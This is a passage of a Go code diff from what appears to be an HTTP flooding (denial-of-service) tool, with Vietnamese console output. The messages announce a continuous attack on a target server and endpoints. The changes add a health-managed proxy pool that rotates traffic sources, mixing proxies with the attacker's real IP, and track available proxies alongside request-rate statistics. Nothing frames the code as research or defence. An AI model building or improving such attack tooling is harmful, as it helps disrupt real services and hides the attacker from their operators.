 		fmt.Printf("⚠️ Lỗi khi đọc file proxy: %v - Tiếp tục với kết nối trực tiếp\n", err)
 	}
 
-	if len(proxies) == 0 {
+	if proxyPool == nil || len(proxyPool.proxies) == 0 {
 		fmt.Println("⚠️ Không có proxy nào được tải - Sẽ sử dụng kết nối trực tiếp (IP thật)")
 	} else {
-		fmt.Printf("✅ Đã tải %d proxy từ file\n", len(proxies))
+		fmt.Printf("✅ Đã tải %d proxy từ file\n", len(proxyPool.proxies))
 	}
 
 	fmt.Printf("🎯 TARGET: %s:%s (%s)\n", TARGET_SERVER, TARGET_PORT, PROTOCOL)
 	fmt.Printf("📍 ENDPOINTS: %v\n", TARGET_ENDPOINTS)
 	fmt.Printf("🚀 BẮT ĐẦU TẤN CÔNG LIÊN TỤC VỚI CHẾ ĐỘ HỖN HỢP (PROXY + IP THẬT)!\n")
 	fmt.Printf("💪 ĐA LUỒNG: %d kết nối đồng thời\n", maxConcurrent)
+	fmt.Printf("🔄 PROXY POOL: %d proxy với quản lý sức khỏe tự động\n", len(proxyPool.proxies))
 	fmt.Println("⚠️  Nhấn Ctrl+C để dừng chương trình")
 
 	start := time.Now()
@@ -693,6 +1071,18 @@ func main() {
 					successPercentage = float64(currentSuccessCount) / float64(currentTotalRequests) * 100
 				}
 
+				// Đếm proxy khả dụng
+				var availableProxies int = 0
+				if proxyPool != nil {
+					proxyPool.mutex.Lock()
+					for i := range proxyPool.proxies {
+						if proxyPool.proxies[i].isAvailable() {
+							availableProxies++
+						}
+					}
+					proxyPool.mutex.Unlock()
+				}
+
 				// Hiển thị thống kê chi tiết hơn
 				fmt.Printf("\n=== THỐNG KÊ HIỆN TẠI (sau %v) ===\n", totalTime)
 				fmt.Printf("Tổng số requests: %d (%.2f requests/giây)\n",
@@ -707,6 +1097,11 @@ func main() {
 					atomic.LoadInt32(&activeRequests),
 					atomic.LoadInt32(&stats.maxGoroutines),
 					maxConcurrent)
+
+				if proxyPool != nil {
+					fmt.Printf("Proxy khả dụng: %d/%d\n",
+						availableProxies, len(proxyPool.proxies))
+				}
 
 				if stats.successCount > 0 {
 					avgDuration := time.Duration(atomic.LoadInt64(&stats.totalDuration) / atomic.LoadInt64(&stats.successCount))
@@ -745,7 +1140,7 @@ func main() {
 				// Thực hiện công việc
 				var dummyWG sync.WaitGroup
 				dummyWG.Add(1)
-				sendHTTPRequest(job.endpoint, job.clientID, stats, &dummyWG, proxies)
+				sendHTTPRequest(job.endpoint, job.clientID, stats, &dummyWG, proxyPool)
 
 				// Giải phóng tài nguyên
 				<-semaphore
